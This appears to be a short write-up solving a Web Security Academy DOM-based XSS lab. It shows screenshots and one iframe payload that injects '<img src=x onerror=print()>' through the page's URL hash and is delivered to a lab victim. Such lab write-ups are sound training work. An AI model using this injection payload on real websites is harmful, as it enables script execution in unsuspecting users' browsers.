![image](https://github.com/udayk01/Web-Security/assets/52235763/0a1583aa-4fac-41d7-8614-20da5f3a180f)

## Solution:

> Notice the vulnerable code on the home page using Burp or the browser's DevTools.

![image](https://github.com/udayk01/Web-Security/assets/52235763/a118377d-7011-4b67-b566-f23d055536a7)

> From the lab banner, open the exploit server.

![image](https://github.com/udayk01/Web-Security/assets/52235763/61a3e475-81e9-4336-8d8a-b1852a073f3c)

> In the Body section, add the following malicious iframe:

```<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>```

![image](https://github.com/udayk01/Web-Security/assets/52235763/65fe1f72-8cfb-4e44-a197-b266d017f544)

> Store the exploit, then click View exploit to confirm that the print() function is called.

![image](https://github.com/udayk01/Web-Security/assets/52235763/dc9c8c0a-60a1-49a3-b74c-273768f512e8)

> Click on deliver the exploit to the victim

![image](https://github.com/udayk01/Web-Security/assets/52235763/c3c14d43-0a8d-4a44-831f-22dff06a8b40)

> Lab Solved

![image](https://github.com/udayk01/Web-Security/assets/52235763/8e577d74-4186-4a9d-ae67-39d689840d8f)
